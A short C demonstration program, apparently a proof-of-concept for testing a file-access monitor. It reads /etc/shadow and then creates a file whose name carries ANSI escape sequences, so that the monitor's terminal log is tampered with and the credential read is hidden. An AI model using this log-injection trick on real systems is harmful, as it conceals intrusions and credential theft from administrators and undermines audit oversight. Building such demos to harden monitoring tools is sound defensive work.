#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

static void read_file(const char *path)
{
    int fd = open(path, O_RDONLY);
    if (fd >= 0)
        close(fd);
}

static void create_file(const char *path)
{
    int fd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0)
        close(fd);
}

int main(void)
{
    printf("=== Log Injection via ANSI Escape Sequences ===\n\n");

    printf("[1] normal activity\n");
    create_file("/tmp/app.log");
    printf("[2] malicious read of /etc/shadow\n");
    read_file("/etc/shadow");
    usleep(300000);
    printf("[3] tampering the log\n");
    create_file("/etc\x1b[1A/bashrc\x1b[1B\x1b[13C");
    usleep(300000);
    return 0;
}

